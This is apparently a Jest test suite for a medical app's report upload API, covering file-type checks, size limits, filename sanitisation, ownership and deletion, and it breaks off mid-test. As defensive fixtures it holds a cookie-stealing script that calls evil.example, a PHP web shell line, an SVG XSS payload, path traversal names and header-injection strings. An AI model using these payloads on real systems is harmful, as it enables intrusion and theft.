'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const mongoose = require('mongoose');

const UPLOAD_ROOT = fs.mkdtempSync(path.join(os.tmpdir(), 'vaidyaai-reports-test-'));
process.env.UPLOAD_ROOT = UPLOAD_ROOT;
process.env.UPLOAD_MAX_BYTES = String(64 * 1024);

const { app, request, registerUser, createUserWithRole, login } = require('./helpers');
const config = require('../src/config/env');
const Report = require('../src/models/Report');
const { ROLES } = require('../src/utils/roles');
const {
  sanitizeFilename,
  detectFileType,
  generateStoredFilename,
  contentDispositionAttachment,
} = require('../src/utils/fileSecurity');

const REPORTS = `${config.apiPrefix}/reports`;
const PASSWORD = 'Str0ng!Passw0rd';

const auth = (token) => ({ Authorization: `Bearer ${token}` });

async function makeUser(email) {
  const { res } = await registerUser({ email, name: 'Test User' });
  expect(res.status).toBe(201);
  return { token: res.body.data.accessToken, id: res.body.data.user.id, email };
}

async function makePrivilegedUser(role, email) {
  const user = await createUserWithRole(role, { email, password: PASSWORD });
  const res = await login(email, PASSWORD);
  expect(res.status).toBe(200);
  return { token: res.body.data.accessToken, id: user._id.toString(), email };
}


const pdfBytes = (filler = 'lab report body') =>
  Buffer.concat([Buffer.from('%PDF-1.7\n'), Buffer.from(filler), Buffer.from('\n%%EOF\n')]);

const pngBytes = () =>
  Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    Buffer.from([0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52]),
    Buffer.alloc(64, 0x11),
  ]);

const jpegBytes = () =>
  Buffer.concat([
    Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00]),
    Buffer.alloc(64, 0x22),
    Buffer.from([0xff, 0xd9]),
  ]);

const sha256 = (buffer) => crypto.createHash('sha256').update(buffer).digest('hex');

function uploadFile(token, buffer, filename, options = {}) {
  const req = request(app).post(REPORTS);
  if (token) req.set(auth(token));
  if (options.reportDate) req.field('reportDate', options.reportDate);
  return req.attach('file', buffer, {
    filename,
    contentType: options.contentType || 'application/octet-stream',
  });
}

function listStoredFiles(dir = UPLOAD_ROOT) {
  if (!fs.existsSync(dir)) return [];
  return fs.readdirSync(dir, { withFileTypes: true }).flatMap((entry) => {
    const full = path.join(dir, entry.name);
    return entry.isDirectory() ? listStoredFiles(full) : [full];
  });
}

afterEach(() => {
  jest.restoreAllMocks();
  for (const entry of fs.readdirSync(UPLOAD_ROOT)) {
    fs.rmSync(path.join(UPLOAD_ROOT, entry), { recursive: true, force: true });
  }
});

afterAll(() => {
  fs.rmSync(UPLOAD_ROOT, { recursive: true, force: true });
});

describe('Module 3 - Medical Report Upload and Management', () => {
  describe('POST /reports - upload', () => {
    let user;
    beforeEach(async () => {
      user = await makeUser('uploader@example.com');
    });

    it.each([
      ['PDF', () => pdfBytes(), 'labs.pdf', 'application/pdf', 'application/pdf'],
      ['PNG', () => pngBytes(), 'scan.png', 'image/png', 'image/png'],
      ['JPG', () => jpegBytes(), 'scan.jpg', 'image/jpeg', 'image/jpeg'],
      ['JPEG', () => jpegBytes(), 'scan.jpeg', 'image/jpeg', 'image/jpeg'],
    ])('accepts a %s and stores metadata + file', async (_label, make, name, ct, expectedMime) => {
      const buffer = make();
      const res = await uploadFile(user.token, buffer, name, { contentType: ct });

      expect(res.status).toBe(201);
      expect(res.body.success).toBe(true);

      const { report } = res.body.data;
      expect(report.mimeType).toBe(expectedMime);
      expect(report.sizeBytes).toBe(buffer.length);
      expect(report.originalName).toBe(name);
      expect(report.status).toBe('uploaded');
      expect(report.storageDriver).toBe('local');
      expect(report.user).toBe(user.id);
      expect(report.storageKey).toBeUndefined();

      const stored = listStoredFiles();
      expect(stored).toHaveLength(1);
      expect(path.basename(path.dirname(stored[0]))).toBe(user.id);
      expect(fs.readFileSync(stored[0]).equals(buffer)).toBe(true);
    });

    it('computes the SHA-256 checksum of the file contents', async () => {
      const buffer = pdfBytes('checksum me');
      const res = await uploadFile(user.token, buffer, 'labs.pdf');
      expect(res.status).toBe(201);
      expect(res.body.data.report.checksumSha256).toBe(sha256(buffer));
    });

    it('names the stored file itself and never reuses the client filename', async () => {
      const res = await uploadFile(user.token, pdfBytes(), 'labs.pdf');
      expect(res.status).toBe(201);

      const stored = listStoredFiles();
      expect(path.basename(stored[0])).toMatch(/^[a-f0-9]{64}\.pdf$/);
      expect(path.basename(stored[0])).not.toContain('labs');
    });

    it('records an explicit reportDate distinct from the upload date', async () => {
      const res = await uploadFile(user.token, pdfBytes(), 'labs.pdf', {
        reportDate: '2024-03-14',
      });
      expect(res.status).toBe(201);
      const { report } = res.body.data;
      expect(new Date(report.reportDate).toISOString()).toBe('2024-03-14T00:00:00.000Z');
      expect(report.chronoDate).toBe(report.reportDate);
      expect(new Date(report.uploadedAt).getTime()).toBeGreaterThan(
        new Date(report.reportDate).getTime()
      );
    });

    it('falls back to the upload date when no reportDate is given', async () => {
      const res = await uploadFile(user.token, pdfBytes(), 'labs.pdf');
      expect(res.status).toBe(201);
      expect(res.body.data.report.reportDate).toBeUndefined();
      expect(res.body.data.report.chronoDate).toBe(res.body.data.report.uploadedAt);
    });

    it('rejects a future reportDate with 422', async () => {
      const future = new Date(Date.now() + 90 * 24 * 3600 * 1000).toISOString();
      const res = await uploadFile(user.token, pdfBytes(), 'labs.pdf', { reportDate: future });
      expect(res.status).toBe(422);
      expect(res.body.error.code).toBe('VALIDATION_ERROR');
      expect(listStoredFiles()).toHaveLength(0);
    });

    it('rejects a non-date reportDate with 422 and stores nothing', async () => {
      const res = await uploadFile(user.token, pdfBytes(), 'labs.pdf', {
        reportDate: 'not-a-date',
      });
      expect(res.status).toBe(422);
      expect(listStoredFiles()).toHaveLength(0);
      expect(await Report.countDocuments({})).toBe(0);
    });

    it('rejects a request with no file at all (400)', async () => {
      const res = await request(app).post(REPORTS).set(auth(user.token)).send();
      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(listStoredFiles()).toHaveLength(0);
    });

    it('rejects a multipart request that carries only fields (400)', async () => {
      const res = await request(app)
        .post(REPORTS)
        .set(auth(user.token))
        .field('reportDate', '2024-01-01');
      expect(res.status).toBe(400);
      expect(listStoredFiles()).toHaveLength(0);
    });

    it('rejects an empty file (400)', async () => {
      const res = await uploadFile(user.token, Buffer.alloc(0), 'empty.pdf');
      expect(res.status).toBe(400);
      expect(listStoredFiles()).toHaveLength(0);
    });

    it('rejects a file sent under an unexpected field name (400, not 500)', async () => {
      const res = await request(app)
        .post(REPORTS)
        .set(auth(user.token))
        .attach('document', pdfBytes(), { filename: 'labs.pdf' });
      expect(res.status).toBe(400);
      expect(res.body.error.code).toBe('BAD_REQUEST');
      expect(listStoredFiles()).toHaveLength(0);
    });

    it('rejects a second file part (400)', async () => {
      const res = await request(app)
        .post(REPORTS)
        .set(auth(user.token))
        .attach('file', pdfBytes(), { filename: 'a.pdf' })
        .attach('file', pdfBytes(), { filename: 'b.pdf' });
      expect(res.status).toBe(400);
      expect(listStoredFiles()).toHaveLength(0);
    });

    it('requires authentication (401)', async () => {
      const res = await uploadFile(null, pdfBytes(), 'labs.pdf');
      expect(res.status).toBe(401);
      expect(listStoredFiles()).toHaveLength(0);
      expect(await Report.countDocuments({})).toBe(0);
    });
  });

  describe('file type is decided by magic bytes, never by the client', () => {
    let user;
    beforeEach(async () => {
      user = await makeUser('typecheck@example.com');
    });

    const expectRejected = async (res) => {
      expect(res.status).toBe(415);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('UNSUPPORTED_MEDIA_TYPE');
      expect(listStoredFiles()).toHaveLength(0);
      expect(await Report.countDocuments({})).toBe(0);
    };

    it('rejects an HTML payload named report.pdf and declared as application/pdf', async () => {
      const payload = Buffer.from(
        '<html><body><script>fetch("//evil.example/"+document.cookie)</script></body></html>'
      );
      await expectRejected(
        await uploadFile(user.token, payload, 'report.pdf', {
          contentType: 'application/pdf',
        })
      );
    });

    it('rejects a PHP payload named report.pdf', async () => {
      const payload = Buffer.from('<?php system($_GET["c"]); ?>\n');
      await expectRejected(
        await uploadFile(user.token, payload, 'report.pdf', {
          contentType: 'application/pdf',
        })
      );
    });

    it('rejects an SVG even though it is an image (stored-XSS vector)', async () => {
      const payload = Buffer.from(
        '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
      );
      await expectRejected(
        await uploadFile(user.token, payload, 'chart.png', { contentType: 'image/svg+xml' })
      );
    });

    it('rejects a Windows executable renamed to .jpg', async () => {
      const payload = Buffer.concat([Buffer.from('MZ'), Buffer.alloc(128, 0x90)]);
      await expectRejected(await uploadFile(user.token, payload, 'scan.jpg'));
    });

    it('rejects a ZIP/Office container renamed to .pdf', async () => {
      const payload = Buffer.concat([
        Buffer.from([0x50, 0x4b, 0x03, 0x04]),
        Buffer.alloc(64, 0),
      ]);
      await expectRejected(await uploadFile(user.token, payload, 'labs.pdf'));
    });

    it('rejects plain text, however it is labelled', async () => {
      await expectRejected(
        await uploadFile(user.token, Buffer.from('HbA1c 6.8 %\n'), 'labs.pdf', {
          contentType: 'application/pdf',
        })
      );
    });

    it('rejects a payload with the PDF signature at a non-zero offset', async () => {
      const payload = Buffer.concat([Buffer.from('<html>'), pdfBytes()]);
      await expectRejected(await uploadFile(user.token, payload, 'labs.pdf'));
    });

    it('accepts a real PDF even when the client mislabels it as text/plain', async () => {
      const res = await uploadFile(user.token, pdfBytes(), 'labs.txt', {
        contentType: 'text/plain',
      });
      expect(res.status).toBe(201);
      expect(res.body.data.report.mimeType).toBe('application/pdf');
    });
  });

  describe('size limits', () => {
    let user;
    beforeEach(async () => {
      user = await makeUser('bigfiles@example.com');
    });

    it('rejects an oversized upload with 413 - not 500, not a hang', async () => {
      const oversized = Buffer.concat([
        Buffer.from('%PDF-1.7\n'),
        Buffer.alloc(config.upload.maxBytes * 2, 0x41),
      ]);
      const res = await uploadFile(user.token, oversized, 'huge.pdf');

      expect(res.status).toBe(413);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('PAYLOAD_TOO_LARGE');
      expect(JSON.stringify(res.body)).not.toMatch(/node_modules|\.js:\d+|MulterError/);
      expect(listStoredFiles()).toHaveLength(0);
      expect(await Report.countDocuments({})).toBe(0);
    });

    it('accepts a file just under the limit', async () => {
      const buffer = Buffer.concat([
        Buffer.from('%PDF-1.7\n'),
        Buffer.alloc(config.upload.maxBytes - 1024, 0x41),
      ]);
      const res = await uploadFile(user.token, buffer, 'big-but-ok.pdf');
      expect(res.status).toBe(201);
      expect(res.body.data.report.sizeBytes).toBe(buffer.length);
    });
  });

  describe('client filenames are never trusted', () => {
    let user;
    beforeEach(async () => {
      user = await makeUser('filenames@example.com');
    });

    it.each([
      ['../../../../etc/passwd.pdf', 'passwd.pdf'],
      ['..\\..\\..\\windows\\system32\\evil.pdf', 'evil.pdf'],
      ['/etc/shadow.pdf', 'shadow.pdf'],
      ['C:\\Windows\\System32\\drivers\\etc\\hosts.pdf', 'hosts.pdf'],
      ['....//....//evil.pdf', 'evil.pdf'],
      ['%2e%2e%2f%2e%2e%2fevil.pdf', '%2e%2e%2f%2e%2e%2fevil.pdf'],
    ])('neutralises the traversal filename %s', async (filename, expectedDisplay) => {
      const res = await uploadFile(user.token, pdfBytes(), filename);
      expect(res.status).toBe(201);
      expect(res.body.data.report.originalName).toBe(expectedDisplay);

      const stored = listStoredFiles();
      expect(stored).toHaveLength(1);
      expect(path.resolve(stored[0]).startsWith(path.resolve(UPLOAD_ROOT) + path.sep)).toBe(
        true
      );
      expect(path.basename(stored[0])).toMatch(/^[a-f0-9]{64}\.pdf$/);
    });

    it('does not write anything outside the upload root', async () => {
      const parent = path.dirname(UPLOAD_ROOT);
      const before = new Set(fs.readdirSync(parent));
      await uploadFile(user.token, pdfBytes(), '../escaped.pdf');
      const after = fs.readdirSync(parent);
      expect(after.filter((entry) => !before.has(entry))).toEqual([]);
    });

    describe('sanitizeFilename', () => {
      it.each([
        ['../../etc/passwd', 'passwd'],
        ['..\\..\\evil.pdf', 'evil.pdf'],
        ['/absolute/path.pdf', 'path.pdf'],
        ['C:file.pdf', 'file.pdf'],
        ['report.pdf\u0000.php', 'report.pdf.php'],
        ['evil.php. ', 'evil.php'],
        ['evil.php...', 'evil.php'],
        ['   .hidden.pdf', 'hidden.pdf'],
        ['CON', 'file_CON'],
        ['nul.pdf', 'file_nul.pdf'],
        ['PRN.jpg', 'file_PRN.jpg'],
        ['LPT1.png', 'file_LPT1.png'],
        ['..', 'report'],
        ['.', 'report'],
        ['', 'report'],
        ['/', 'report'],
        ['a\u0007b.pdf', 'ab.pdf'],
        ['name<>:"|?*.pdf', 'name_______.pdf'],
      ])('sanitizes %j to %j', (input, expected) => {
        expect(sanitizeFilename(input)).toBe(expected);
      });

      it.each([null, undefined, 42, {}, ['a'], true])(
        'returns a safe placeholder for the non-string %j',
        (input) => {
          expect(sanitizeFilename(input)).toBe('report');
        }
      );

      it('caps the length', () => {
        expect(sanitizeFilename(`${'a'.repeat(500)}.pdf`).length).toBeLessThanOrEqual(200);
      });

      it('never returns a value containing a path separator', () => {
        const nasty = [
          '../../x',
          '..\\..\\x',
          'a/b/c.pdf',
          'a\\b\\c.pdf',
          '//server/share/x.pdf',
        ];
        for (const input of nasty) {
          const out = sanitizeFilename(input);
          expect(out).not.toMatch(/[\\/]/);
        }
      });
    });

    it('refuses to build a stored filename for a disallowed extension', () => {
      expect(() => generateStoredFilename('.php')).toThrow();
      expect(() => generateStoredFilename('.svg')).toThrow();
      expect(() => generateStoredFilename('../x')).toThrow();
      expect(generateStoredFilename('.pdf')).toMatch(/^[a-f0-9]{64}\.pdf$/);
    });

    it('builds a Content-Disposition value that cannot inject headers', () => {
      const value = contentDispositionAttachment('re"port\r\nX-Evil: 1.pdf');
      expect(value.startsWith('attachment;')).toBe(true);
      expect(value).not.toMatch(/[\r\n]/);
      const parsed = /^attachment; filename="([^"\\]*)"; filename\*=UTF-8''(\S*)$/.exec(value);
      expect(parsed).not.toBeNull();
      expect(parsed[1]).toBe('re_portX-Evil_ 1.pdf');
    });

    it('detectFileType returns null for empty and non-buffer input', () => {
      expect(detectFileType(Buffer.alloc(0))).toBeNull();
      expect(detectFileType('%PDF-')).toBeNull();
      expect(detectFileType(null)).toBeNull();
    });
  });

  describe('GET /reports - listing, ordering, pagination', () => {
    let user;
    const DATES = ['2023-01-15', '2024-06-01', '2022-09-30', '2025-02-20'];

    beforeEach(async () => {
      user = await makeUser('lister@example.com');
      for (const reportDate of DATES) {
        const res = await uploadFile(user.token, pdfBytes(reportDate), `labs-${reportDate}.pdf`, {
          reportDate,
        });
        expect(res.status).toBe(201);
      }
    });

    const dates = (body) =>
      body.data.reports.map((r) => new Date(r.chronoDate).toISOString().slice(0, 10));

    it('returns the caller\'s reports newest-first by default', async () => {
      const res = await request(app).get(REPORTS).set(auth(user.token));
      expect(res.status).toBe(200);
      expect(dates(res.body)).toEqual(['2025-02-20', '2024-06-01', '2023-01-15', '2022-09-30']);
      expect(res.body.data.pagination.total).toBe(4);
    });

    it('carries the page numbers the stored analysis could not read, and nothing else of it', async () => {
      const [first] = (await request(app).get(REPORTS).set(auth(user.token))).body.data.reports;
      expect(first.pagesUnreadable).toEqual([]);

      await Report.updateOne(
        { _id: first.id },
        { $set: { status: 'processed', 'analysis.pagesUnreadable': [2, 3] } }
      );
      const res = await request(app).get(REPORTS).set(auth(user.token));
      const again = res.body.data.reports.find((r) => r.id === first.id);
      expect(again.pagesUnreadable).toEqual([2, 3]);
      expect(again.analysis).toBeUndefined();
      expect(again.extraction).toBeUndefined();
    });

    it('orders oldest-first on request', async () => {
      const res = await request(app).get(`${REPORTS}?order=asc`).set(auth(user.token));
      expect(res.status).toBe(200);
      expect(dates(res.body)).toEqual(['2022-09-30', '2023-01-15', '2024-06-01', '2025-02-20']);
    });

    it('orders by upload date when asked, which differs from report order', async () => {
      const res = await request(app)
        .get(`${REPORTS}?sort=uploadedAt&order=asc`)
        .set(auth(user.token));
      expect(res.status).toBe(200);
      expect(dates(res.body)).toEqual(DATES.map((d) => d));
    });

    it('paginates without overlapping or skipping', async () => {
      const first = await request(app).get(`${REPORTS}?page=1&limit=2`).set(auth(user.token));
      const second = await request(app).get(`${REPORTS}?page=2&limit=2`).set(auth(user.token));

      expect(first.status).toBe(200);
      expect(second.status).toBe(200);
      expect(first.body.data.reports).toHaveLength(2);
      expect(second.body.data.reports).toHaveLength(2);

      expect(first.body.data.pagination).toMatchObject({
        page: 1,
        limit: 2,
        total: 4,
        totalPages: 2,
        hasNextPage: true,
        hasPrevPage: false,
      });
      expect(second.body.data.pagination).toMatchObject({
        page: 2,
        hasNextPage: false,
        hasPrevPage: true,
      });

      const ids = [...first.body.data.reports, ...second.body.data.reports].map((r) => r.id);
      expect(new Set(ids).size).toBe(4);
      expect(dates(first.body)).toEqual(['2025-02-20', '2024-06-01']);
      expect(dates(second.body)).toEqual(['2023-01-15', '2022-09-30']);
    });

    it('returns an empty page beyond the end rather than an error', async () => {
      const res = await request(app).get(`${REPORTS}?page=9&limit=2`).set(auth(user.token));
      expect(res.status).toBe(200);
      expect(res.body.data.reports).toEqual([]);
      expect(res.body.data.pagination.total).toBe(4);
    });

    it('rejects out-of-range or non-numeric pagination input (422)', async () => {
      for (const qs of ['page=0', 'page=-1', 'limit=0', 'limit=1000', 'page=abc', 'limit=1.5']) {
        const res = await request(app).get(`${REPORTS}?${qs}`).set(auth(user.token));
        expect(res.status).toBe(422);
      }
    });

    it('rejects an unknown sort field (422) - no raw input reaches the sort', async () => {
      const res = await request(app)
        .get(`${REPORTS}?sort=user.password`)
        .set(auth(user.token));
      expect(res.status).toBe(422);
    });

    it('filters by processing status', async () => {
      const all = await request(app).get(`${REPORTS}?status=uploaded`).set(auth(user.token));
      expect(all.status).toBe(200);
      expect(all.body.data.reports).toHaveLength(4);

      const processed = await request(app)
        .get(`${REPORTS}?status=processed`)
        .set(auth(user.token));
      expect(processed.status).toBe(200);
      expect(processed.body.data.reports).toEqual([]);
    });

    it('requires authentication (401)', async () => {
      const res = await request(app).get(REPORTS);
      expect(res.status).toBe(401);
    });
  });

  describe('ownership - a user sees only their own reports', () => {
    let alice;
    let bob;
    let aliceReportId;

    beforeEach(async () => {
      alice = await makeUser('alice@example.com');
      bob = await makeUser('bob@example.com');

      const res = await uploadFile(alice.token, pdfBytes('alice private'), 'alice.pdf');
      expect(res.status).toBe(201);
      aliceReportId = res.body.data.report.id;
    });

    it('B cannot see A\'s report in their own listing', async () => {
      await uploadFile(bob.token, pdfBytes('bob'), 'bob.pdf');
      const res = await request(app).get(REPORTS).set(auth(bob.token));
      expect(res.status).toBe(200);
      expect(res.body.data.reports).toHaveLength(1);
      expect(res.body.data.reports[0].originalName).toBe('bob.pdf');
      expect(res.body.data.reports.map((r) => r.id)).not.toContain(aliceReportId);
    });

    it('B cannot read metadata for A\'s report (404, not 403 - no existence disclosure)', async () => {
      const res = await request(app).get(`${REPORTS}/${aliceReportId}`).set(auth(bob.token));
      expect(res.status).toBe(404);
      expect(res.body.error.code).toBe('NOT_FOUND');
    });

    it('a real id and a random id are indistinguishable to a non-owner', async () => {
      const real = await request(app).get(`${REPORTS}/${aliceReportId}`).set(auth(bob.token));
      const fake = await request(app)
        .get(`${REPORTS}/0123456789abcdef01234567`)
        .set(auth(bob.token));
      expect(real.status).toBe(fake.status);
      expect(real.body.error.code).toBe(fake.body.error.code);
      expect(real.body.error.message).toBe(fake.body.error.message);
    });

    it('B cannot download A\'s report (404)', async () => {
      const res = await request(app)
        .get(`${REPORTS}/${aliceReportId}/download`)
        .set(auth(bob.token));
      expect(res.status).toBe(404);
    });

    it('B cannot delete A\'s report (404) and the file survives', async () => {
      const before = listStoredFiles();
      const res = await request(app).delete(`${REPORTS}/${aliceReportId}`).set(auth(bob.token));
      expect(res.status).toBe(404);
      expect(await Report.countDocuments({ _id: aliceReportId })).toBe(1);
      expect(listStoredFiles()).toEqual(before);
    });

    it.each([
      ['clinician', ROLES.CLINICIAN],
      ['admin', ROLES.ADMIN],
    ])('a %s does NOT bypass ownership on medical data', async (label, role) => {
      const staff = await makePrivilegedUser(role, `${label}@example.com`);

      const read = await request(app).get(`${REPORTS}/${aliceReportId}`).set(auth(staff.token));
      expect(read.status).toBe(404);

      const list = await request(app).get(REPORTS).set(auth(staff.token));
      expect(list.status).toBe(200);
      expect(list.body.data.reports).toEqual([]);

      const download = await request(app)
        .get(`${REPORTS}/${aliceReportId}/download`)
        .set(auth(staff.token));
      expect(download.status).toBe(404);

      const removed = await request(app)
        .delete(`${REPORTS}/${aliceReportId}`)
        .set(auth(staff.token));
      expect(removed.status).toBe(404);
      expect(await Report.countDocuments({ _id: aliceReportId })).toBe(1);
    });

    it.each([
      ['metadata', (id) => request(app).get(`${REPORTS}/${id}`)],
      ['download', (id) => request(app).get(`${REPORTS}/${id}/download`)],
      ['delete', (id) => request(app).delete(`${REPORTS}/${id}`)],
    ])('unauthenticated %s is 401', async (_label, call) => {
      const res = await call(aliceReportId);
      expect(res.status).toBe(401);
    });

    it('rejects a malformed report id without reaching the database', async () => {
      for (const id of ['not-an-id', '../../etc/passwd', '%00', '{"$ne":null}']) {
        const res = await request(app)
          .get(`${REPORTS}/${encodeURIComponent(id)}`)
          .set(auth(alice.token));
        expect([404, 422]).toContain(res.status);
        expect(res.body.success).toBe(false);
      }
    });

    it('returns 404 for a well-formed id that does not exist', async () => {
      const res = await request(app)
        .get(`${REPORTS}/0123456789abcdef01234567`)
        .set(auth(alice.token));
      expect(res.status).toBe(404);
    });
  });

  describe('GET /reports/:id/download', () => {
    let user;
    let reportId;
    let buffer;

    beforeEach(async () => {
      user = await makeUser('downloader@example.com');
      buffer = pdfBytes('downloadable content');
      const res = await uploadFile(user.token, buffer, 'my labs.pdf');
      expect(res.status).toBe(201);
      reportId = res.body.data.report.id;
    });

    it('streams the exact bytes back with hardened headers', async () => {
      const res = await request(app)
        .get(`${REPORTS}/${reportId}/download`)
        .set(auth(user.token))
        .buffer()
        .parse((response, callback) => {
          const chunks = [];
          response.on('data', (chunk) => chunks.push(Buffer.from(chunk)));
          response.on('end', () => callback(null, Buffer.concat(chunks)));
        });

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toContain('application/pdf');
      expect(res.headers['content-disposition']).toMatch(/^attachment;/);
      expect(res.headers['content-disposition']).toContain('my labs.pdf');
      expect(res.headers['x-content-type-options']).toBe('nosniff');
      expect(res.headers['cache-control']).toContain('no-store');
      expect(Number(res.headers['content-length'])).toBe(buffer.length);
      expect(Buffer.from(res.body).equals(buffer)).toBe(true);
    });

    it('404s when the record exists but the stored file has vanished', async () => {
      for (const file of listStoredFiles()) fs.rmSync(file);
      const res = await request(app)
        .get(`${REPORTS}/${reportId}/download`)
        .set(auth(user.token));
      expect(res.status).toBe(404);
    });

    it('rejects a storageKey update through the model (the field is immutable)', async () => {
      await Report.updateOne({ _id: reportId }, { $set: { storageKey: '../escape.txt' } });
      const doc = await Report.findById(reportId);
      expect(doc.storageKey).not.toContain('..');
    });

    it('cannot be steered outside the upload root by a tampered storage key', async () => {
      const secret = path.join(path.dirname(UPLOAD_ROOT), 'vaidyaai-outside-secret.txt');
      fs.writeFileSync(secret, 'TOP SECRET');
      const tamper = (key) =>
        Report.collection.updateOne(
          { _id: new mongoose.Types.ObjectId(reportId) },
          { $set: { storageKey: key } }
        );
      try {
        await tamper(`../${path.basename(secret)}`);
        const res = await request(app)
          .get(`${REPORTS}/${reportId}/download`)
          .set(auth(user.token));
        expect(res.status).toBe(404);
        expect(JSON.stringify(res.body)).not.toContain('TOP SECRET');

        await tamper(path.resolve(secret));
        const absolute = await request(app)
          .get(`${REPORTS}/${reportId}/download`)
          .set(auth(user.token));
        expect(absolute.status).toBe(404);
        expect(JSON.stringify(absolute.body)).not.toContain('TOP SECRET');
      } finally {
        fs.rmSync(secret, { force: true });
      }
    });
  });

  describe('DELETE /reports/:id', () => {
    let user;
    let reportId;

    beforeEach(async () => {
      user = await makeUser('deleter@example.com');
      const res = await uploadFile(user.token, pdfBytes('delete me'), 'gone.pdf');
      expect(res.status).toBe(201);
      reportId = res.body.data.report.id;
    });

    it('removes the database record AND the file', async () => {
      expect(listStoredFiles()).toHaveLength(1);

      const res = await request(app).delete(`${REPORTS}/${reportId}`).set(auth(user.token));
      expect(res.status).toBe(200);
      expect(res.body.data).toMatchObject({ deleted: true, id: reportId, fileRemoved: true });

      expect(await Report.countDocuments({ _id: reportId })).toBe(0);
      expect(listStoredFiles()).toHaveLength(0);
    });

    it('is idempotent from the caller\'s point of view (second delete is 404)', async () => {
      await request(app).delete(`${REPORTS}/${reportId}`).set(auth(user.token));
      const again = await request(app).delete(`${REPORTS}/${reportId}`).set(auth(user.token));
      expect(again.status).toBe(404);
    });

    it('still deletes the record when the file is already missing', async () => {
      for (const file of listStoredFiles()) fs.rmSync(file);
      const res = await request(app).delete(`${REPORTS}/${reportId}`).set(auth(user.token));
      expect(res.status).toBe(200);
      expect(res.body.data.fileRemoved).toBe(false);
      expect(await Report.countDocuments({ _id: reportId })).toBe(0);
    });

    it('does not touch another user\'s files', async () => {
      const other = await makeUser('bystander@example.com');
      await uploadFile(other.token, pdfBytes('keep me'), 'keep.pdf');
      expect(listStoredFiles()).toHaveLength(2);

      await request(app).delete(`${REPORTS}/${reportId}`).set(auth(user.token));
      const remaining = listStoredFiles();
      expect(remaining).toHaveLength(1);
      expect(fs.readFileSync(remaining[0]).toString()).toContain('keep me');
    });
  });

  describe('orphan handling', () => {
    let user;
    beforeEach(async () => {
      user = await makeUser('orphans@example.com');
    });

    it('removes the just-written file when the database insert fails', async () => {
      jest
        .spyOn(Report, 'create')
        .mockRejectedValueOnce(new Error('simulated database failure'));

      const res = await uploadFile(user.token, pdfBytes('would be orphaned'), 'labs.pdf');

      expect(res.status).toBe(500);
      expect(await Report.countDocuments({})).toBe(0);
      expect(listStoredFiles()).toHaveLength(0);
    });

    it('writes no database record when the file write fails', async () => {
      const { getStorage } = require('../src/storage');
      jest
        .spyOn(getStorage(), 'save')
        .mockRejectedValueOnce(new Error('simulated disk failure'));

      const res = await uploadFile(user.token, pdfBytes(), 'labs.pdf');

      expect(res.status).toBe(500);
      expect(await Report.countDocuments({})).toBe(0);
      expect(listStoredFiles()).toHaveLength(0);
    });

    it('surfaces the original failure even when the rollback also fails', async () => {
      const { getStorage } = require('../src/storage');
      jest.spyOn(Report, 'create').mockRejectedValueOnce(new Error('simulated database failure'));
      jest
        .spyOn(getStorage(), 'remove')
        .mockRejectedValueOnce(new Error('simulated cleanup failure'));

      const res = await uploadFile(user.token, pdfBytes(), 'labs.pdf');
      expect(res.status).toBe(500);
      expect(await Report.countDocuments({})).toBe(0);
    });
  });

  describe('data required by later modules', () => {
    it('stores everything Module 4 needs to fetch and process the file', async () => {
      const user = await makeUser('module4@example.com');
      const buffer = pdfBytes('for OCR');
      const res = await uploadFile(user.token, buffer, 'labs.pdf');
      expect(res.status).toBe(201);

      const doc = await Report.findById(res.body.data.report.id);
      expect(doc.storageDriver).toBe('local');
      expect(typeof doc.storageKey).toBe('string');
      expect(doc.mimeType).toBe('application/pdf');
      expect(doc.sizeBytes).toBe(buffer.length);
      expect(doc.checksumSha256).toBe(sha256(buffer));
      expect(doc.status).toBe('uploaded');

      doc.status = 'processing';
      await doc.save();
      doc.status = 'processed';
      await doc.save();
      expect((await Report.findById(doc._id)).status).toBe('processed');
    });

    it('rejects a status outside the enum', async () => {
      const user = await makeUser('enum@example.com');
      const res = await uploadFile(user.token, pdfBytes(), 'labs.pdf');
      const doc = await Report.findById(res.body.data.report.id);
      doc.status = 'hacked';
      await expect(doc.save()).rejects.toThrow();
    });

    it('keeps chronoDate consistent with reportDate on every save', async () => {
      const user = await makeUser('chrono@example.com');
      const res = await uploadFile(user.token, pdfBytes(), 'labs.pdf');
      const doc = await Report.findById(res.body.data.report.id);
      expect(doc.chronoDate.getTime()).toBe(doc.uploadedAt.getTime());

      doc.reportDate = new Date('2021-05-05T00:00:00.000Z');
      await doc.save();
      expect(doc.chronoDate.toISOString()).toBe('2021-05-05T00:00:00.000Z');
    });

    it('cannot be re-pointed at another user', async () => {
      const alice = await makeUser('immutable-a@example.com');
      const bob = await makeUser('immutable-b@example.com');
      const res = await uploadFile(alice.token, pdfBytes(), 'labs.pdf');

      const doc = await Report.findById(res.body.data.report.id);
      doc.user = bob.id;
      await doc.save();
      expect((await Report.findById(doc._id)).user.toString()).toBe(alice.id);
    });
  });

  describe("whose report -- someone else's, on upload and after", () => {
    const uploadAs = (token, fields) => {
      const req = request(app).post(REPORTS).set(auth(token));
      for (const [k, v] of Object.entries(fields)) req.field(k, String(v));
      return req.attach('file', pdfBytes(), { filename: 'labs.pdf', contentType: 'application/pdf' });
    };
    const patchSubject = (token, id, body) =>
      request(app).patch(`${REPORTS}/${id}/subject`).set(auth(token)).send(body);

    it("a report is the owner's own unless said otherwise", async () => {
      const alice = await makeUser('subject.default@example.com');
      const res = await uploadFile(alice.token, pdfBytes(), 'labs.pdf');
      expect(res.status).toBe(201);
      expect(res.body.data.report.subject).toEqual({ owner: 'self' });
      expect(res.body.data.report.subjectChangedSinceAnalysis).toBe(false);
    });

    it("stores someone else's age and sex given on upload", async () => {
      const alice = await makeUser('subject.upload@example.com');
      const res = await uploadAs(alice.token, { subjectOwner: 'other', subjectAge: '34', subjectSex: 'female' });
      expect(res.status).toBe(201);
      expect(res.body.data.report.subject).toEqual({ owner: 'other', age: 34, sex: 'female' });
    });

    it("someone else's report may leave age and sex unknown", async () => {
